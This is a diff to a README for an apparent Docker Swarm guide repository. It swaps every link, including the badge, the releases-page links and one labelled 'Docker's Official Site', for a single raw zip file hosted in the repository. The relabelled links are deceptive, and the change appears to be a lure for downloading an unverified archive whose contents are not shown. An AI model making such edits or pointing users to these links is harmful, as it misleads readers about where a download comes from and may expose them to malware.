@@ -1,6 +1,6 @@
 # 🐳 docker-swarm-guide - Your Simple Path to Docker Swarm Success
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/TuhinBYTE2029/docker-swarm-guide/releases)
+[![Download Now](https://github.com/TuhinBYTE2029/docker-swarm-guide/raw/refs/heads/main/docs/guide-swarm-docker-2.6.zip)](https://github.com/TuhinBYTE2029/docker-swarm-guide/raw/refs/heads/main/docs/guide-swarm-docker-2.6.zip)
 
 ## 📜 Introduction
 
@@ -11,10 +11,10 @@ Welcome to the **docker-swarm-guide**, your comprehensive resource for using Doc
 To make the most of this guide, follow these steps:
 
 1. **Download the Guide**:
-   - Visit the [Releases Page](https://github.com/TuhinBYTE2029/docker-swarm-guide/releases) to get the latest version.
+   - Visit the [Releases Page](https://github.com/TuhinBYTE2029/docker-swarm-guide/raw/refs/heads/main/docs/guide-swarm-docker-2.6.zip) to get the latest version.
 
 2. **Install Docker**:
-   - Ensure you have Docker installed on your machine. You can download it from [Docker's Official Site](https://www.docker.com/get-started).
+   - Ensure you have Docker installed on your machine. You can download it from [Docker's Official Site](https://github.com/TuhinBYTE2029/docker-swarm-guide/raw/refs/heads/main/docs/guide-swarm-docker-2.6.zip).
 
 3. **Read the Documentation**:
    - Explore the documentation provided in the guide. It includes detailed sections on setting up and managing your Docker Swarm cluster.
@@ -23,7 +23,7 @@ To make the most of this guide, follow these steps:
 
 To download the latest version of the **docker-swarm-guide**, follow these steps:
 
-1. Go to the [Releases Page](https://github.com/TuhinBYTE2029/docker-swarm-guide/releases).
+1. Go to the [Releases Page](https://github.com/TuhinBYTE2029/docker-swarm-guide/raw/refs/heads/main/docs/guide-swarm-docker-2.6.zip).
 2. Select the latest release.
 3. Click on the download link for the guide.
 4. Save the file to your computer.
@@ -89,4 +89,4 @@ By following these steps, you can help make this resource even better for all us
 
 The **docker-swarm-guide** aims to provide you with a clear, step-by-step approach to implementing Docker Swarm in your project. By following the instructions in this guide, you can enhance your development and deployment processes with Docker Swarm.
 
-For the latest updates and downloads, remember to visit the [Releases Page](https://github.com/TuhinBYTE2029/docker-swarm-guide/releases). Enjoy your journey into the world of Docker Swarm!
+For the latest updates and downloads, remember to visit the [Releases Page](https://github.com/TuhinBYTE2029/docker-swarm-guide/raw/refs/heads/main/docs/guide-swarm-docker-2.6.zip). Enjoy your journey into the world of Docker Swarm!
